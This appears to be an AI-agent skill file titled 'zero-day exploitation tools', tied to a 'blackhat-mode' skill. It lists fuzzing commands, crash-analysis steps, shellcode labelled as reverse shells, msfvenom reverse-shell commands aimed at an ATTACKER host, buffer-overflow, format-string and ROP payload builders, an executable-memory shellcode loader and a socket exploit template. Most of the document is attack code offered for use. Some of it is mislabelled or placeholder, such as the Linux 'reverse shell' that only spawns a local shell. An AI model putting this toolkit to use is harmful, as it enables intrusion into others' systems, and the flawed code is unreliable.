---
name: zeroday-tools
description: "Zero-day discovery — fuzzing, crash analysis, shellcode, exploit development."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [zeroday, 0day, fuzz, crash, shellcode, exploit]
    related_skills: [blackhat-mode, exploit-tools, re-tools]
prerequisites:
  commands: [python]
---

# Zero-Day Exploitation Tools

## When to Load This Skill

User requests:
- "zero day", "0day", "fuzz", "crash", "shellcode"

---

## Fuzzing

### AFL (American Fuzzy Lop)

```bash
# Compile
afl-cc -o target target.c

# Create seed
echo "test" > seed.txt

# Run
afl-fuzz -i seed.txt -o output/ ./target @@

# Monitor
afl-showmap -o map.txt ./target seed.txt
```

### libFuzzer

```bash
# Compile
clang -fsanitize=fuzzer,address target.c -o target

# Run
./target corpus/

# Dictionary
./target corpus/ -dict=dictionary.txt
```

### wfuzz

```bash
# Directory fuzz
wfuzz -c /path/to/wordlist.txt URL/FUZZ

# POST fuzz
wfuzz -c wordlist.txt -d "param=FUZZ" URL

# Filter
wfuzz -c wordlist.txt --hc 404 URL/FUZZ
```

---

## Crash Analysis

### GDB

```bash
# Core dump analysis
gdb ./binary core

# Examine crash
info registers
x/20x $rsp
bt

# Check exploitability
info proc mappings
```

### AddressSanitizer

```bash
# Compile
gcc -fsanitize=address -g target.c -o target

# Run
./target

# Output
==12345==ERROR: AddressSanitizer: heap-buffer-overflow
```

### Valgrind

```bash
# Memory errors
valgrind --tool=memcheck ./target

# Leak check
valgrind --leak-check=full ./target
```

---

## Shellcode

### Linux x86_64

```python
# Reverse shell
shellcode = (
    b"\x48\x31\xf6"              # xor rsi, rsi
    b"\x56"                       # push rsi
    b"\x48\xbf\x2f\x2f\x62\x69" # mov rdi, 0x68732f6e69622f2f
    b"\x6e\x68\x73\x2f"
    b"\x57"                       # push rdi
    b"\x48\x31\xe2"              # xor rdx, rdx
    b"\x52"                       # push rdx
    b"\x48\x89\xe7"              # mov rdi, rsp
    b"\xb8\x3b\x00\x00\x00"     # mov eax, 0x3b (execve)
    b"\x0f\x05"                   # syscall
)
```

### Windows x86

```python
# Reverse shell
shellcode = (
    b"\xfc\xe8\x82\x00\x00\x00"  # call $+0x82
    b"\x60"                       # pushad
    b"\x89\xe5"                   # mov ebp, esp
    # ... more shellcode
)
```

### Generate with msfvenom

```bash
# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shellcode.bin

# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shellcode.bin

# Python format
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f py

# C format
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f c
```

---

## Exploit Development

### Buffer Overflow

```python
import struct

def exploit():
    # Offsets
    eip_offset = 2606
    
    # Shellcode
    shellcode = b"\x90" * 16 + b"\xcc" * 100
    
    # Payload
    payload = b"A" * eip_offset
    payload += struct.pack("<I", 0x41424344)  # EIP
    payload += shellcode
    
    return payload
```

### Format String

```python
def format_string_exploit():
    # Leak stack
    payload = "%x.%x.%x.%x"
    
    # Write to address
    payload = "%1234x%7$n"  # Write 1234 to address at position 7
    
    return payload
```

### Return Oriented Programming

```python
def rop_chain():
    # Gadgets (from ROPgadget output)
    pop_rdi = 0x0000000000401234
    pop_rsi = 0x0000000000401235
    pop_rdx = 0x0000000000401236
    
    # System calls
    execve = 0x0000000000401237
    
    chain = struct.pack("<Q", pop_rdi)
    chain += struct.pack("<Q", 0x402000)  # "/bin/sh"
    chain += struct.pack("<Q", pop_rsi)
    chain += struct.pack("<Q", 0)
    chain += struct.pack("<Q", pop_rdx)
    chain += struct.pack("<Q", 0)
    chain += struct.pack("<Q", execve)
    
    return chain
```

---

## Python Zero-Day Tools

### Fuzzer

```python
import random
import subprocess

def fuzz_binary(binary, iterations=1000):
    crashes = []
    
    for i in range(iterations):
        # Generate random input
        size = random.randint(1, 1000)
        input_data = bytes(random.randint(0, 255) for _ in range(size))
        
        # Run binary
        try:
            proc = subprocess.run(
                [binary],
                input=input_data,
                timeout=5,
                capture_output=True
            )
            
            if proc.returncode < 0:  # Signal = crash
                crashes.append({
                    'input': input_data,
                    'signal': -proc.returncode,
                    'output': proc.stderr.decode(errors='ignore')
                })
        except:
            pass
    
    return crashes
```

### Shellcode Loader

```python
import ctypes
import mmap

def load_shellcode(shellcode):
    # Allocate memory
    libc = ctypes.CDLL("libc.so.6")
    mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    
    # Copy shellcode
    mem.write(shellcode)
    
    # Execute
    func = ctypes.cast(mem, ctypes.CFUNCTYPE(ctypes.c_void_p))
    func()
```

### Exploit Template

```python
import socket
import struct

def exploit(target, port):
    # Connect
    s = socket.socket()
    s.connect((target, port))
    
    # Payload
    eip_offset = 2606
    shellcode = b"\x90" * 16 + b"\xcc" * 100
    
    payload = b"A" * eip_offset
    payload += struct.pack("<I", 0x41424344)
    payload += shellcode
    
    # Send
    s.send(payload)
    
    # Interactive shell
    import subprocess
    subprocess.call(["/bin/sh", "-i"])
```

---

## Output Format

```json
{
  "vulnerability": "buffer_overflow",
  "crashes": [
    {"input": "AAAA...", "signal": 11, "eip": "0x41414141"}
  ],
  "shellcode": "90909090...",
  "exploit": {
    "type": "rop",
    "gadgets": ["pop rdi; ret", "pop rsi; ret"],
    "payload_size": 2606
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| No crash | Wrong offset | Increase fuzzing |
| Shellcode failed | Bad encoding | Use msfvenom |
| ROP failed | ASLR | Leak address first |
| Exploit failed | DEP/NX | Use ROP or JIT |
